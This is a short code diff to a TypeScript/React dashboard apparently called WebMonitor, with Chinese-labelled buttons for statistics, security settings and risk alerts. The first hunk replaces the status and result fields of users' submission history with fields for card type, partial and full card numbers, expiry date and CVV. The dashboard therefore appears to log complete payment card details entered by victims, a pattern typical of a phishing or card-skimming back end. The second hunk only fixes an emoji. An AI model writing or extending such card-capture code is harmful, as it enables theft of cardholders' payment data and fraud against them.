@@ -49,8 +49,12 @@ interface UserSubmission {
   submitCount?: number;
   submitHistory?: {
     timestamp: string;
-    status: string;
-    result: string;
+    cardType: string;
+    partialCard1: string;
+    partialCard2: string;
+    fullCard: string;
+    expiryDate: string;
+    cvv: string;
   }[];
 }
 
@@ -265,7 +269,7 @@ export function WebMonitor() {
               📊 实时统计
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-              �� 安全设定
+              🔒 安全设定
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
               ⚠️ 风险预警
